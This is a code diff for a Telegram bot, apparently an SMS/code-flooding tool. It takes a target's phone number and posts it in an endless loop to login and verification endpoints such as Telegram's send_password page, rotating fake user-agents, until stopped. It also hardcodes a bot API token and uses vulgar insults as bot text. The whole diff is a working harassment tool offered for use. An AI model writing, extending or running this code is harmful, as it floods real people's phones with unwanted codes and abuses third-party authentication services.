@@ -1,8 +1,9 @@
 import telebot
 import requests
 from fake_useragent import UserAgent
-import time
 import threading
+import time
+import re
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
 
@@ -21,42 +22,72 @@ endpoints = [
     'https://my.telegram.org/auth/send_password'
 ]
 
+active_spams = {}
+awaiting_phone = set()
+
+def is_phone(text):
+    return bool(re.match(r'^\+?\d{7,15}$', text.strip()))
+
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message, "Отправь /spam +79998887766 5 (номер и кол-во циклов)")
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
+    markup.add('spam')
+    bot.send_message(message.chat.id, "privet yeban lizni bebru", reply_markup=markup)
 
-@bot.message_handler(commands=['spam'])
-def spam(message):
-    parts = message.text.split()
-    if len(parts) < 3:
-        bot.reply_to(message, "Формат: /spam +79998887766 5")
+@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'spam')
+def ask_phone(message):
+    chat_id = message.chat.id
+    if chat_id in active_spams:
+        bot.reply_to(message, "spam uje idet, chtoby ostanovit' /stop")
         return
-    phone = parts[1]
-    try:
-        cycles = int(parts[2])
-    except:
-        bot.reply_to(message, "Кол-во циклов должно быть числом")
+    awaiting_phone.add(chat_id)
+    bot.reply_to(message, "napishi nomer telephona")
+
+@bot.message_handler(func=lambda m: m.chat.id in awaiting_phone and is_phone(m.text))
+def start_spam(message):
+    chat_id = message.chat.id
+    awaiting_phone.discard(chat_id)
+    if chat_id in active_spams:
         return
-    if cycles <= 0:
-        bot.reply_to(message, "Циклов должно быть > 0")
-        return
-    bot.reply_to(message, f"Начинаю спам для {phone}, {cycles} циклов")
-    def worker():
+    phone = message.text.strip()
+    bot.reply_to(message, "drochka nachata shob ostanovit napishi /stop")
+    stop_event = threading.Event()
+    active_spams[chat_id] = stop_event
+    def spam_worker():
         ua = UserAgent()
-        total = 0
-        for cycle in range(1, cycles + 1):
+        while not stop_event.is_set():
             headers = {'user-agent': ua.random}
             data = {'phone': phone}
             for endpoint in endpoints:
+                if stop_event.is_set():
+                    break
                 try:
-                    r = requests.post(endpoint, headers=headers, data=data, timeout=10)
-                    if r.status_code == 200:
-                        total += 1
+                    requests.post(endpoint, headers=headers, data=data, timeout=10)
                 except:
                     pass
+                time.sleep(1)
             time.sleep(5)
-        bot.send_message(message.chat.id, f"Готово! Всего запросов: {total}")
-    threading.Thread(target=worker).start()
+        active_spams.pop(chat_id, None)
+        bot.send_message(chat_id, "spam ostanovlen")
+    threading.Thread(target=spam_worker).start()
+
+@bot.message_handler(commands=['stop'])
+def stop_spam(message):
+    chat_id = message.chat.id
+    if chat_id in active_spams:
+        active_spams[chat_id].set()
+        bot.reply_to(message, "ostanavlivaem spam...")
+    else:
+        bot.reply_to(message, "net aktivnogo spama")
+
+@bot.message_handler(func=lambda m: True)
+def fallback(message):
+    chat_id = message.chat.id
+    if chat_id in awaiting_phone:
+        awaiting_phone.discard(chat_id)
+        bot.reply_to(message, "nomer ne raspoznan, poprobuyte snova cherez 'spam'")
+    else:
+        bot.reply_to(message, "neponyatno, ispolzuy /start ili /stop")
 
 if __name__ == '__main__':
     bot.infinity_polling()
